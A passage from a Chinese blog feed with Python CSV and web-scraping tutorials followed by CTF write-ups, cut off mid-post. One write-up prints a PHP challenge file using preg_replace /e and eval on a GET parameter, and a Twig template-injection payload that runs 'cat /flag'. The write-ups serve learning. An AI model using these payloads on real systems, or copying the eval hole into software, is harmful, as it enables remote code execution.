    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="读取csv文件"><a href="#读取csv文件" class="headerlink" title="读取csv文件"></a>读取csv文件</h3><p>通过csv.reader()和DictReader()两个函数<br>reader()函数返回一个迭代器 会包含表头 通过next函数可以跳过，但是它只能通过下标访问数据；<br>DictReader()函数返回一个字典，不包含表头，可以通过键名访问！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import csv</span><br><span class="line"># with open(&#39;1 (2).csv&#39;,&#39;r&#39;) as fp:</span><br><span class="line">#     reader&#x3D;csv.reader(fp)</span><br><span class="line">#     # next(reader)</span><br><span class="line">#     for x in reader:</span><br><span class="line">#         print(x)</span><br><span class="line">with open(&#39;1 (2).csv&#39;,&#39;r&#39;) as fp:</span><br><span class="line">    reader&#x3D;csv.DictReader(fp)</span><br><span class="line">    for i in reader:</span><br><span class="line">        print(i[&#39;学生姓名&#39;])</span><br></pre></td></tr></table></figure><hr><h3 id="写入csv文件"><a href="#写入csv文件" class="headerlink" title="写入csv文件"></a>写入csv文件</h3><p>两个方法：<strong>一个通过writer()函数 一个通过Dictwriter()函数。</strong><br><strong>writerow() writerows()</strong><br>都是先将文件通过上面两个函数封装成对象，然后在对csv对象进行操作。<br><strong>注意Dictwriter()有两个参数一个是文件，另一个是表头(列表)，先调用writeheader()函数将表头写进去。</strong><br>这两个函数都可以写入，看给的数据：如果是元组用第一个函数；给的是字典用第二个函数。</p><hr><h3 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h3><p>项目说明：爬取豆瓣图片前十页，并用csv库存储下来。<br>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import csv</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">header&#x3D;&#123;</span><br><span class="line">    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line">headers&#x3D;[&#39;书名&#39;,&#39;相关信息&#39;,&#39;评分&#39;]</span><br><span class="line">def spdier(url):</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;header)</span><br><span class="line">    text&#x3D;resp.text</span><br><span class="line">    html&#x3D;BeautifulSoup(text,&quot;lxml&quot;)</span><br><span class="line">    # print(html.prettify())</span><br><span class="line">    alist&#x3D;html.find_all(&#39;a&#39;,class_&#x3D;&#39;title&#39;)</span><br><span class="line">    titles&#x3D;[]</span><br><span class="line">    for a in alist:</span><br><span class="line">        title&#x3D;list(a.stripped_strings)[0]</span><br><span class="line">        titles.append(title)</span><br><span class="line">    infolist&#x3D;html.find_all(&#39;div&#39;,class_&#x3D;&#39;desc&#39;)</span><br><span class="line">    infos&#x3D;[]</span><br><span class="line">    for info in infolist:</span><br><span class="line">        info1&#x3D;list(info.stripped_strings)[0]</span><br><span class="line">        infos.append(info1)</span><br><span class="line">    ratelist&#x3D;html.find_all(&#39;span&#39;,class_&#x3D;&#39;rating_nums&#39;)</span><br><span class="line">    rates&#x3D;[]</span><br><span class="line">    for i in ratelist:</span><br><span class="line">        rate&#x3D;list(i.stripped_strings)[0]</span><br><span class="line">        rates.append(rate)</span><br><span class="line">    books&#x3D;[]</span><br><span class="line">    for i in range(len(rates)):</span><br><span class="line">        book&#x3D;&#123;</span><br><span class="line">            &#39;书名&#39;:titles[i],</span><br><span class="line">            &#39;相关信息&#39;:infos[i],</span><br><span class="line">            &#39;评分&#39;:rates[i]</span><br><span class="line">        &#125;</span><br><span class="line">        books.append(book)</span><br><span class="line">    return books</span><br><span class="line">def csv_storage(list_books,filename):</span><br><span class="line">    with open(filename,&#39;w&#39;,encoding&#x3D;&#39;utf-8&#39;,newline&#x3D;&#39;&#39;) as fp:</span><br><span class="line">        writer&#x3D;csv.DictWriter(fp,headers)</span><br><span class="line">        writer.writeheader()</span><br><span class="line">        writer.writerows(list_books)</span><br><span class="line">def main():</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;www.douban.com&#x2F;tag&#x2F;%E5%B0%8F%E8%AF%B4&#x2F;book?start&#x3D;&#123;&#125;&quot;</span><br><span class="line">    books&#x3D;[]</span><br><span class="line">    for i in range(0,136,15):</span><br><span class="line">        url&#x3D;base_url.format(i)</span><br><span class="line">        book&#x3D;spdier(url)</span><br><span class="line">        books +&#x3D;book</span><br><span class="line">    csv_storage(books,&#39;豆瓣图片.csv&#39;)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>今天学习了csv库存储爬取下来的数据，通过这个项目巩固了学习的内容。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;读取csv文件&quot;&gt;&lt;a href=&quot;#读取csv文件&quot; class=&quot;headerlink&quot; title=&quot;读取csv文件&quot;&gt;&lt;/a&gt;读取c
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://da4er.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://da4er.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式_爬取中国古诗词网与豆瓣热门图书</title>
    <link href="https://da4er.top/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6.html"/>
    <id>https://da4er.top/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6.html</id>
    <published>2020-02-15T08:56:46.000Z</published>
    <updated>2020-02-15T09:01:58.294Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="一-爬取中国诗词网"><a href="#一-爬取中国诗词网" class="headerlink" title="一.爬取中国诗词网"></a>一.爬取中国诗词网</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">def handler_url(url):</span><br><span class="line">    header&#x3D;&#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    reponse&#x3D;requests.get(url,header)</span><br><span class="line">    text&#x3D;reponse.text</span><br><span class="line">    titles&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;cont&quot;&gt;.*?&lt;b&gt;(.*?)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    years&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;&lt;a.*?&gt;(.*?)&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    autors&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;.*?&lt;a.*?&gt;.*?&lt;a.*?&gt;(.*?)&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    contents_tmp&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;.*?&lt;div\sclass&#x3D;&quot;contson&quot;\s.*?&gt;(.*?)&lt;&#x2F;div&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    contents&#x3D;[]</span><br><span class="line">    for c in contents_tmp:</span><br><span class="line">        x&#x3D;re.sub(r&#39;&lt;.*?&gt;&#39;,&#39;&#39;,c)</span><br><span class="line">        contents.append(x.strip())</span><br><span class="line">    poems&#x3D;[]</span><br><span class="line">    for value in zip(titles,years,autors,contents):</span><br><span class="line">        title,year,autor,content&#x3D;value</span><br><span class="line">        poem&#x3D;&#123;</span><br><span class="line">            &quot;title&quot;:title,</span><br><span class="line">            &quot;year&quot;:year,</span><br><span class="line">            &quot;autor&quot;:autor,</span><br><span class="line">            &quot;content&quot;:content</span><br><span class="line">        &#125;</span><br><span class="line">        poems.append(poem)</span><br><span class="line">    for a in poems:</span><br><span class="line">        print(a)</span><br><span class="line">def main():</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;www.gushiwen.org&#x2F;default_&#123;&#125;.aspx&quot;</span><br><span class="line">    for i in range(1,7):</span><br><span class="line">        url&#x3D;base_url.format(i)</span><br><span class="line">        handler_url(url)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/4.png" class title="Da4er"><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/5.png" class title="Da4er"><hr><h3 id="二-爬取豆瓣热门图书"><a href="#二-爬取豆瓣热门图书" class="headerlink" title="二.爬取豆瓣热门图书"></a>二.爬取豆瓣热门图书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">HEADERS&#x3D;&#123;</span><br><span class="line">    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line">def get_detail_page(url):</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;HEADERS)</span><br><span class="line">    text&#x3D;resp.text</span><br><span class="line">    detail_pages&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;main-bd&quot;&gt;.*?&lt;a\shref&#x3D;&quot;(.*?)&quot;&gt;.*?&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    return detail_pages</span><br><span class="line">def handle_detail_page(url):</span><br><span class="line">    book&#x3D;&#123;&#125;</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;HEADERS)</span><br><span class="line">    text&#x3D;resp.text</span><br><span class="line">    titles&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;article&quot;&gt;.*?&lt;span.*?&gt;(.*?)&lt;&#x2F;span&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    articles_tmp&#x3D;re.findall(r&#39;&lt;div\sid&#x3D;&quot;link-report&quot;&gt;.*?&lt;p&gt;.*&lt;&#x2F;p&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    articles&#x3D;[]</span><br><span class="line">    for a in articles_tmp:</span><br><span class="line">        x&#x3D;re.sub(r&#39;&lt;.*?&gt;&#39;,&#39;&#39;,a)</span><br><span class="line">        y&#x3D;x.replace(&#39;\r&#39;,&#39;&#39;).replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">        a&#x3D;re.sub(r&#39;&lt;div\s.*?&gt;&#39;,&#39;&#39;,y)</span><br><span class="line">        b&#x3D;a.replace(&#39; &#39;,&#39;&#39;)</span><br><span class="line">        articles.append(b)</span><br><span class="line">    # print(articles)</span><br><span class="line">    # print(titles)</span><br><span class="line">    book&#x3D;&#123;</span><br><span class="line">        &#39;title&#39;:titles,</span><br><span class="line">        &#39;article&#39;:articles</span><br><span class="line">    &#125;</span><br><span class="line">    print(book)</span><br><span class="line">def main():</span><br><span class="line">    urls&#x3D;[]</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;book.douban.com&#x2F;review&#x2F;best&#x2F;?start&#x3D;&#123;&#125;&quot;</span><br><span class="line">    for i in range(0,41,20):</span><br><span class="line">        url&#x3D;base_url.format(i)</span><br><span class="line">        urls.append(url)</span><br><span class="line">    for a in urls:</span><br><span class="line">        detail_urls&#x3D;get_detail_page(a)</span><br><span class="line">        for f in detail_urls:</span><br><span class="line">            handle_detail_page(f)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/1.png" class title="Da4er"><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/2.png" class title="Da4er"><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/3.png" class title="Da4er"><hr><h3 id="三-总结"><a href="#三-总结" class="headerlink" title="三.总结"></a>三.总结</h3><p><strong>这两个小的爬虫项目，网站都没有进行反爬处理，所以说对于我们爬出页面信息还是比较简单的，关键在于数据怎么解析，最近一直在看正则表达式，所以找了两个小的项目练一练，这两个小项目也可以使用beatifulsoup或者xml库进行解析，找时间再试试别的方法解析数据吧~</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;一-爬取中国诗词网&quot;&gt;&lt;a href=&quot;#一-爬取中国诗词网&quot; class=&quot;headerlink&quot; title=&quot;一.爬取中国诗词网&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://da4er.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://da4er.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>2.13 [BJDCTF2020]ZJCTF，不过如此&amp;Cookie is so stable</title>
    <link href="https://da4er.top/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable.html"/>
    <id>https://da4er.top/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable.html</id>
    <published>2020-02-13T05:45:01.000Z</published>
    <updated>2020-02-13T05:46:24.352Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h3><p>打开网页通过阅读源码，知道我们要读到next.php的源码，还要使text文件的内容为”I have a dream”，所以可以使用php伪协议进行写入和读取。</p><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/1.png" class title="Da4er"><p>得到next.php的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line">        &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">@eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用过分析知preg_replace()使用的/e模式可以存在远程执行代码，<a href="https://xz.aliyun.com/t/2557">参考博客</a>，所以我们可以有两种方法进行读取flag。<br>第一种：利用给的getFlag()函数：</p><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/2.png" class title="Da4er"><p>第二种可以通过构造post传参：</p><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/3.png" class title="Da4er"><hr><h3 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h3><p>Twig模板注入：<br>在cookie中存在，因为我们分析题目知，题目会把cookie中的user的值返回到登入后的页面中，而且没有进行过滤。<br>检测是哪种模板注入：输入49显示的是49，而不是7个7，说明是Twig模板注入，可以直接使用payload进行读取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;;</span><br></pre></td></tr></table></figure><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/4.png" class title="Da4er"><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/5.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;ZJCTF，不过如此&quot;&gt;&lt;a href=&quot;#ZJCTF，不过如此&quot; class=&quot;headerlink&quot; title=&quot;ZJCTF，不过如此
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.13 BUUCTF Misc john-in-the-middle&amp;谁赢了比赛&amp;二维码&amp;小易的U盘&amp;黑客帝国&amp;真的很杂</title>
    <link href="https://da4er.top/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82.html"/>
    <id>https://da4er.top/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82.html</id>
    <published>2020-02-13T03:31:57.000Z</published>
    <updated>2020-02-13T03:35:09.365Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h3><hr><p>打开流量包发现全是tcp,http协议，直接导出http对象。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/1.png" class title="Da4er"><p>在http对象中有个logo.png，Stegsolve工具打开，分析颜色通道得到flag。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/2.png" class title="Da4er"><hr><h3 id="谁赢了比赛"><a href="#谁赢了比赛" class="headerlink" title="谁赢了比赛"></a>谁赢了比赛</h3><hr><p>binwalk分析一下发现里面有个压缩包，再用foremost分离出来，发现gif有秘密，爆破一下。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/3.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/4.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/5.png" class title="Da4er"><p>分析gif图片，在第310帧发现假的flag，再用Stegsolve工具分析各个颜色通道，得到flag。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/6.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/7.png" class title="Da4er"><hr><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>二维码被撕碎了，只能用ps拼接，拼接完扫描得到flag。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/8.png" class title="Da4er"><hr><h3 id="小易的u盘"><a href="#小易的u盘" class="headerlink" title="小易的u盘"></a>小易的u盘</h3><p>binwalk分离出两个压缩包</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/9.png" class title="Da4er"><p>打开发现有很多exe文件，分析exe文件发现有个exe文件的创造时间不同，直接用ida反编译这个文件，便可得到flag。</p><img 